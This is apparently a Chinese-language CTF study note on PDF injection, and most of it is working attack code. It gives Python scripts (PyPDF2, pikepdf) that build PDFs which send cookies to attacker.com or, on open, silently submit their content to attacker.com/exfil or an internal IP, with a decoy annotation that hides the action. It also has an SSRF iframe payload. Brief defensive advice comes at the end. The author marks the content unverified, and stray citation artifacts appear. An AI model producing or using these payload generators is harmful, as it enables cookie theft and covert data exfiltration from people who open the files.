---
title: PDF注入
auther: Creexile
date: 2025-07-10
lastMod: 2025-07-10
summary: ''
cover: ''
category: CTF
draft: true
comments: false
sticky: 0
tags:
  - 文件上传
  - XSS
---

> 该文章内容未验证

# PDF注入

[文章](https://portswigger.net/research/portable-data-exfiltration)

# XSS

在PDF注释或文本字段中注入JavaScript代码，当用户点击PDF内元素（如链接、注释）时, 或者直接是打开文件时触发

## 利用条件：

PDF渲染器支持JavaScript执行（如Adobe Acrobat、旧版Chrome PDFium）2610。
网站使用浏览器内置PDF渲染器（如`<object>`标签嵌入）

## Payload

- Adobe Acrobat：支持完整JS模型，可窃取Cookie或发起CSRF
- Chrome (PDFium)：限制JS执行，仅部分版本可触发
- Firefox：通常无法执行, 不过我还没试

```javascript
app.alert('XSS') // Adobe JS模型专用:cite[6]
this.submitForm({ cURL: 'https://attacker.com', cSubmitAs: 'PDF' })
// 窃取PDF内容:cite[10]
```

下面是python的

```python
from PyPDF2 import PdfReader, PdfWriter

# 创建含JS的PDF
def create_xss_pdf():
    writer = PdfWriter()
    page = writer.add_blank_page(width=72, height=72)
    writer.add_js("app.alert('XSS PoC');")

    with open("xss.pdf", "wb") as f:
        writer.write(f)

create_xss_pdf()
```

增强版 (窃取Cookie):

```python
def create_cookie_stealer_pdf():
    writer = PdfWriter()
    writer.add_blank_page(width=72, height=72)

    # 使用更隐蔽的JS执行方式
    js_code = """
    var cookie = document.cookie;
    var img = new Image();
    img.src = 'https://attacker.com/steal?data=' + encodeURIComponent(cookie);
    """
    writer.add_js(js_code)

    with open("cookie_stealer.pdf", "wb") as f:
        writer.write(f)
```

# 数据窃取

## 原理

利用PDF的`SubmitForm`动作或JavaScript自动将PDF内容POST到攻击者服务器。

1. 注入注释块覆盖原始动作，例如：

```
/blah)>>/A<</S/SubmitForm/Flags 256/F(https://attacker.com)>>`10。
```

2. 设置 `Flags=256` 启用PDF内容提交（无需用户点击）

## payload

依赖PDF库漏洞（如PDF-Lib、jsPDF未转义括号）

```python
import pikepdf
from pikepdf import Array, Dictionary, Name, String

def create_auto_exfiltration_pdf():
    with pikepdf.new() as pdf:
        # 确保PDF至少有一页
        if len(pdf.pages) == 0:
            pdf.add_blank_page()

        # 修正1：使用正确的Name对象作为字典键
        action = Dictionary({
            Name('/S'): Name('/SubmitForm'),
            Name('/F'): String("https://attacker.com/exfil"),
            Name('/Flags'): 256,  # 关键！启用静默提交+包含注释
            Name('/Fields'): Array([String("Field1")]),  # 修正2：去掉开头的斜杠
        })

        # 文档打开时自动触发
        pdf.Root.OpenAction = action

        # 修正3：Rect坐标必须用Array包装
        annot = Dictionary({
            Name('/Type'): Name('/Annot'),
            Name('/Subtype'): Name('/Text'),
            Name('/Rect'): Array([100, 100, 200, 200]),  # 坐标必须是PDF数组
            Name('/Contents'): String("正常注释（掩护恶意动作）"),
        })

        # 修正4：安全地添加注释
        if '/Annots' not in pdf.pages[0]:
            pdf.pages[0].Annots = Array()
        pdf.pages[0].Annots.append(annot)

        pdf.save("auto_data_exfil.pdf")
        print("PDF created with auto data exfiltration action.")

if __name__ == "__main__":
    create_auto_exfiltration_pdf()
```

# SSRF(未成功)

## 原理

在PDF生成过程中注入HTML标签（如`<iframe>`），触发服务器请求内部资源。

利用场景：网站使用服务端HTML转PDF工具（如HiQPdf）

## Payload

```html
<iframe src="http://192.168.0.131/exploit.html"></iframe>
```

结合JavaScript窃取响应数据

```python
import pikepdf
from pikepdf import Array, Dictionary, Name, String


def create_auto_exfiltration_pdf():
    with pikepdf.new() as pdf:
        # 确保PDF至少有一页
        if len(pdf.pages) == 0:
            pdf.add_blank_page()

        # 配置自动提交动作 - 使用显式的键值对创建方式
        action = Dictionary()
        action[Name.S] = Name.SubmitForm
        action[Name.F] = String("http://169.254.48.138:12000/evil")
        action[Name.Flags] = 256  # 启用静默提交+包含注释
        action[Name.Fields] = Array([String("Field1")])

        # 文档打开时自动触发
        pdf.Root.OpenAction = action

        # 添加伪装注释
        annot = Dictionary()
        annot[Name.Type] = Name.Annot
        annot[Name.Subtype] = Name.Text
        annot[Name.Rect] = Array([100, 100, 200, 200])
        annot[Name.Contents] = String("正常注释（掩护恶意动作）")

        # 添加注释到第一页
        if "/Annots" not in pdf.pages[0]:
            pdf.pages[0].Annots = Array()
        pdf.pages[0].Annots.append(annot)

        pdf.save("auto_data_exfil.pdf")
        print("PDF created with auto data exfiltration action.")


if __name__ == "__main__":
    create_auto_exfiltration_pdf()

```

# 攻击成功的前提

1. 网站允许用户上传PDF，且使用有漏洞的PDF库生成/渲染（如PDF-Lib、jsPDF）
2. 渲染器未过滤危险元素（注释URI、JavaScript动作）

# 防御措施

1. 输入处理：
   - 转义用户输入中的括号 `()` 和反斜线 `\`，防止PDF代码注入
   - 禁用PDF注释中的JavaScript执行

2. 渲染策略：
   - 强制下载PDF而非在线渲染（HTTP头：`Content-Disposition: attachment`）
   - 使用第三方渲染器（如PDF.js）替代浏览器内置引擎
